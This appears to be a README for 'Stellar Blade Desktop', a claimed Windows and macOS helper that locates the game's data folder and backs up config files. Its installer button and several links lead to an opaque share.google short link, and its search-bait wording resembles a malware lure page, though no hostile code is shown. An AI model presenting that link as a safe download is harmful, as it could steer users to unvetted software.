![Stellar Blade Desktop](assets/hero.png)

# Stellar Blade Desktop

*Find the Stellar Blade folder fast and keep a local spare.*

## What Stellar Blade Desktop is

**Stellar Blade Desktop** runs on your own PC. Local Windows and macOS helper for Stellar Blade data paths, config and export caches, and export folders.

Stellar Blade drops data files next to launcher caches.

The CLI in this repository is the documented interface; the desktop build is the same job in an installer.

## Editions

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## What it does

- Finds the Stellar Blade data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## Why it exists

People search Stellar Blade desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/a-robertson-146/stellar-blade-desktop

MIT license. See `LICENSE`.
